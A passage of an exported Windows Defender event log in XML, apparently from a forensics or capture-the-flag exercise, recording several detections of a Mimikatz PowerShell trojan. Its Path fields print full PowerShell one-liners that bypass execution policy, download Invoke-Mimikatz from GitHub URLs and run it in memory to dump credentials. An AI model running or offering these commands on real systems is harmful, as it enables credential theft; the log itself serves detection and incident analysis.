<Data Name="Filename">amsistream-F008C4F9276F619E509066DE0DDC46D7</Data>
<Data Name="Sha256">fd2a59396b1c5c060b249c933eeae93c81de8965de634a8b28d6574dcb3c8b3a</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">1117</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:40:10.484034"></TimeCreated>
<EventRecordID>125</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="4940"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Detection ID">{D53FC5AA-BAD9-4D9D-ACDB-3E77CC747542}</Data>
<Data Name="Detection Time">2020-10-27T02:40:00.872Z</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Threat ID">2147725502</Data>
<Data Name="Threat Name">Trojan:PowerShell/Mimikatz.A</Data>
<Data Name="Severity ID">5</Data>
<Data Name="Severity Name">Severe</Data>
<Data Name="Category ID">8</Data>
<Data Name="Category Name">Trojan</Data>
<Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:PowerShell/Mimikatz.A&amp;threatid=2147725502&amp;enterprise=0</Data>
<Data Name="Status Code">4</Data>
<Data Name="Status Description"></Data>
<Data Name="State">2</Data>
<Data Name="Source ID">2</Data>
<Data Name="Source Name">%%820</Data>
<Data Name="Process Name">Unknown</Data>
<Data Name="Detection User">NT AUTHORITY\SYSTEM</Data>
<Data Name="Unused3"></Data>
<Data Name="Path">CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c iex(new-object net.webclient).downloadstring('https://gist.githubusercontent.com/phwRi7EUp/146c73e8d28eab5c8b546861e06226e7/raw/881106760796a219711035fba797bafe76f22368/SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg.ps1')Invoke-Mimikatz;</Data>
<Data Name="Origin ID">0</Data>
<Data Name="Origin Name">%%844</Data>
<Data Name="Execution ID">0</Data>
<Data Name="Execution Name">%%812</Data>
<Data Name="Type ID">0</Data>
<Data Name="Type Name">%%822</Data>
<Data Name="Pre Execution Status">0</Data>
<Data Name="Action ID">3</Data>
<Data Name="Action Name">%%808</Data>
<Data Name="Unused4"></Data>
<Data Name="Error Code">0x00000000</Data>
<Data Name="Error Description">The operation completed successfully. </Data>
<Data Name="Unused5"></Data>
<Data Name="Post Clean Status">0</Data>
<Data Name="Additional Actions ID">0</Data>
<Data Name="Additional Actions String">No additional actions required</Data>
<Data Name="Remediation User">NT AUTHORITY\SYSTEM</Data>
<Data Name="Unused6"></Data>
<Data Name="Signature Version">AV: 1.325.1502.0, AS: 1.325.1502.0, NIS: 1.325.1502.0</Data>
<Data Name="Engine Version">AM: 1.1.17500.4, NIS: 1.1.17500.4</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">1116</EventID>
<Version>0</Version>
<Level>3</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:40:32.105284"></TimeCreated>
<EventRecordID>126</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="4940"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Detection ID">{398EA98D-7EC0-422A-AC31-04B25E64D956}</Data>
<Data Name="Detection Time">2020-10-27T02:40:32.092Z</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Threat ID">2147725502</Data>
<Data Name="Threat Name">Trojan:PowerShell/Mimikatz.A</Data>
<Data Name="Severity ID">5</Data>
<Data Name="Severity Name">Severe</Data>
<Data Name="Category ID">8</Data>
<Data Name="Category Name">Trojan</Data>
<Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:PowerShell/Mimikatz.A&amp;threatid=2147725502&amp;enterprise=0</Data>
<Data Name="Status Code">1</Data>
<Data Name="Status Description"></Data>
<Data Name="State">1</Data>
<Data Name="Source ID">2</Data>
<Data Name="Source Name">%%820</Data>
<Data Name="Process Name">Unknown</Data>
<Data Name="Detection User">NT AUTHORITY\SYSTEM</Data>
<Data Name="Unused3"></Data>
<Data Name="Path">CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')</Data>
<Data Name="Origin ID">0</Data>
<Data Name="Origin Name">%%844</Data>
<Data Name="Execution ID">0</Data>
<Data Name="Execution Name">%%812</Data>
<Data Name="Type ID">0</Data>
<Data Name="Type Name">%%822</Data>
<Data Name="Pre Execution Status">0</Data>
<Data Name="Action ID">9</Data>
<Data Name="Action Name">%%887</Data>
<Data Name="Unused4"></Data>
<Data Name="Error Code">0x00000000</Data>
<Data Name="Error Description">The operation completed successfully. </Data>
<Data Name="Unused5"></Data>
<Data Name="Post Clean Status">0</Data>
<Data Name="Additional Actions ID">0</Data>
<Data Name="Additional Actions String">No additional actions required</Data>
<Data Name="Remediation User"></Data>
<Data Name="Unused6"></Data>
<Data Name="Signature Version">AV: 1.325.1502.0, AS: 1.325.1502.0, NIS: 1.325.1502.0</Data>
<Data Name="Engine Version">AM: 1.1.17500.4, NIS: 1.1.17500.4</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">1117</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:40:42.339989"></TimeCreated>
<EventRecordID>127</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="4940"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Detection ID">{398EA98D-7EC0-422A-AC31-04B25E64D956}</Data>
<Data Name="Detection Time">2020-10-27T02:40:32.092Z</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Threat ID">2147725502</Data>
<Data Name="Threat Name">Trojan:PowerShell/Mimikatz.A</Data>
<Data Name="Severity ID">5</Data>
<Data Name="Severity Name">Severe</Data>
<Data Name="Category ID">8</Data>
<Data Name="Category Name">Trojan</Data>
<Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:PowerShell/Mimikatz.A&amp;threatid=2147725502&amp;enterprise=0</Data>
<Data Name="Status Code">4</Data>
<Data Name="Status Description"></Data>
<Data Name="State">2</Data>
<Data Name="Source ID">2</Data>
<Data Name="Source Name">%%820</Data>
<Data Name="Process Name">Unknown</Data>
<Data Name="Detection User">NT AUTHORITY\SYSTEM</Data>
<Data Name="Unused3"></Data>
<Data Name="Path">CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')</Data>
<Data Name="Origin ID">0</Data>
<Data Name="Origin Name">%%844</Data>
<Data Name="Execution ID">0</Data>
<Data Name="Execution Name">%%812</Data>
<Data Name="Type ID">0</Data>
<Data Name="Type Name">%%822</Data>
<Data Name="Pre Execution Status">0</Data>
<Data Name="Action ID">3</Data>
<Data Name="Action Name">%%808</Data>
<Data Name="Unused4"></Data>
<Data Name="Error Code">0x00000000</Data>
<Data Name="Error Description">The operation completed successfully. </Data>
<Data Name="Unused5"></Data>
<Data Name="Post Clean Status">0</Data>
<Data Name="Additional Actions ID">0</Data>
<Data Name="Additional Actions String">No additional actions required</Data>
<Data Name="Remediation User">NT AUTHORITY\SYSTEM</Data>
<Data Name="Unused6"></Data>
<Data Name="Signature Version">AV: 1.325.1502.0, AS: 1.325.1502.0, NIS: 1.325.1502.0</Data>
<Data Name="Engine Version">AM: 1.1.17500.4, NIS: 1.1.17500.4</Data>
</EventData>
</Event>

</Events>
